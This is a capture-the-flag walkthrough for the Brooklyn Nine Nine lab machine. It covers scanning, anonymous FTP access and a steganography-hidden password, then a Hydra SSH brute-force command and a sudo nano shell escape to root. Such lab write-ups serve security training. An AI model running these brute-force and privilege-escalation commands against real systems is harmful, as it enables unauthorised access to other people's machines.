# Brooklyn Nine Nine Walkthrough

## Tools Used
- Nmap  
- Hydra  
- FTP  
- SSH  
- Stegseek  

## Step 1: Scanning the Target
- Ping the target IP before scanning. If ping requests are blocked, use -Pn.  
- Basic scan: nmap <target_ip>  
- Deep scan: nmap -sV <target_ip>  

## Step 2: Enumeration
- Services found: FTP, SSH, HTTP.  
- Check FTP for anonymous login: ftp <target_ip>  
- Anonymous login allowed.  
- Use ls and get to download files.  
- Found note_to_jake.txt → Jake has a weak password. Other users: Amy and Holt.  

## Step 3: HTTP Server
- Visiting the website shows an image.  
- Viewing source reveals a comment suggesting hidden data in the image.  

## Step 4: Uncovering Hidden Data
- Use Stegseek on the image from HTTP server.  
- Extracted a text file containing Holt’s password.  

## Step 5: Logging In
- Way 1: Crack Jake’s weak password with Hydra:  
  hydra -l jake -P /usr/share/wordlists/rockyou.txt <target_ip> ssh  
  - Jake can access Holt’s home directory.  
  - Use cat to read user.txt in Holt’s home dir.  

- Way 2: Use Holt’s password from Stegseek.  
  ssh holt@<target_ip>  

## Step 6: Root Flag
- Check privileges: sudo -l  
- Output: (ALL) NOPASSWD: /bin/nano → Holt can run nano as root without password.  

### Exploit
1. Run sudo nano  
2. Press Ctrl+R → Read mode  
3. Press Ctrl+X → Execute command  
4. Enter: reset; sh 1>&0 2>&0  
   - reset; clears the terminal inside nano.  
   - sh 1>&0 2>&0 redirects stdout and stderr to stdin, making the shell interactive.  

- This spawns a root shell.  
- Access /root/root.txt to retrieve the final flag.  
